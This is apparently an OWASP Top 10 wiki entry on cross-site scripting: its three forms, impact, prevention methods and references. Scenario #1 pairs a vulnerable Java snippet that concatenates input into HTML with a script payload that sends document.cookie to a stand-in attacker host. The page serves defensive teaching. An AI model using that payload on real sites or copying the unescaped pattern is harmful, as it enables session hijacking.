`   <td colspan=2 ``>`

Automated tools can detect and exploit all three forms of XSS, and there
are freely available exploitation frameworks.

</td>

`   <td colspan=2  ``>`

`XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.`
`Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. `

</td>

`   <td colspan=2  ``>`

`The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. `

</td>

There are three forms of XSS, usually targeting users' browsers:

  - <b>Reflected XSS</b>: The application or API includes unvalidated
    and unescaped user input as part of HTML output. A successful attack
    can allow the attacker to execute arbitrary HTML and JavaScript in
    the victim’s browser. Typically the user will need to interact with
    some malicious link that points to an attacker-controlled page, such
    as malicious watering hole websites, advertisements, or similar.
  - <b>Stored XSS</b>: The application or API stores unsanitized user
    input that is viewed at a later time by another user or an
    administrator. Stored XSS is often considered a high or critical
    risk.
  - <b>DOM XSS</b>: JavaScript frameworks, single-page applications, and
    APIs that dynamically include attacker-controllable data to a page
    are vulnerable to DOM XSS. Ideally, the application would not send
    attacker-controllable data to unsafe JavaScript APIs.

Typical XSS attacks include session stealing, account takeover, MFA
bypass, DOM node replacement or defacement (such as trojan login
panels), attacks against the user's browser such as malicious software
downloads, key logging, and other client-side attacks.

Preventing XSS requires separation of untrusted data from active browser
content. This can be achieved by:

  - Using frameworks that automatically escape XSS by design, such as
    the latest Ruby on Rails, React JS. Learn the limitations of each
    framework's XSS protection and appropriately handle the use cases
    which are not covered.
  - Escaping untrusted HTTP request data based on the context in the
    HTML output (body, attribute, JavaScript, CSS, or URL) will resolve
    Reflected and Stored XSS vulnerabilities. The <u>[OWASP Cheat Sheet
    'XSS
    Prevention'](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")</u> has
    details on the required data escaping techniques.
  - Applying context-sensitive encoding when modifying the browser
    document on the client side acts against DOM XSS. When this cannot
    be avoided, similar context sensitive escaping techniques can be
    applied to browser APIs as described in the <u>[OWASP Cheat Sheet
    'DOM based XSS
    Prevention'](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink").
  - Enabling a <u>[Content Security Policy
    (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)</u> as
    a defense-in-depth mitigating control against XSS. It is effective
    if no other vulnerabilities exist that would allow placing malicious
    code via local file includes (e.g. path traversal overwrites or
    vulnerable libraries from permitted content delivery networks).

<b>Scenario \#1</b>: The application uses untrusted data in the
construction of the following HTML snippet without validation or
escaping: <b><span style="color:red;"> (String) page += "\<input
name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'\>"; </span></b>

The attacker modifies the ‘CC’ parameter in the browser to:
<b><span style="color:red;"> '\>

<script>

document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie

</script>

'. </span></b> This attack causes the victim’s session ID to be sent to
the attacker’s website, allowing the attacker to hijack the user’s
current session.

<b>Note</b>: Attackers can use XSS to defeat any automated Cross-Site
Request Forgery (CSRF) defense the application might employ.

  - <u>[OWASP Proactive Controls: Encode
    Data](OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016 "wikilink")</u>
  - <u>[OWASP Proactive Controls: Validate
    Data](OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016 "wikilink")</u>
  - <u>[OWASP Application Security Verification Standard:
    V5](:Category:OWASP_Application_Security_Verification_Standard_Project "wikilink")</u>
  - <u>[OWASP Testing Guide: Testing for Reflected
    XSS](Testing_for_Reflected_Cross_site_scripting_\(OTG-INPVAL-001\) "wikilink")</u>
  - <u>[OWASP Testing Guide: Testing for Stored
    XSS](Testing_for_Stored_Cross_site_scripting_\(OTG-INPVAL-002\) "wikilink")</u>
  - <u>[OWASP Testing Guide: Testing for DOM
    XSS](Testing_for_DOM-based_Cross_site_scripting_\(OTG-CLIENT-001\) "wikilink")</u>
  - <u>[OWASP Cheat Sheet: XSS
    Prevention](XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet "wikilink")</u>
  - <u>[OWASP Cheat Sheet: DOM based XSS
    Prevention](DOM_based_XSS_Prevention_Cheat_Sheet "wikilink")</u>
  - <u>[OWASP Cheat Sheet: XSS Filter
    Evasion](XSS_Filter_Evasion_Cheat_Sheet "wikilink")</u>
  - <u>[OWASP Java Encoder
    Project](OWASP_Java_Encoder_Project "wikilink")</u>

<!-- end list -->

  - <u>[CWE-79: Improper neutralization of user supplied
    input](https://cwe.mitre.org/data/definitions/79.html)</u>
  - <u>[PortSwigger: Client-side template
    injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)</u>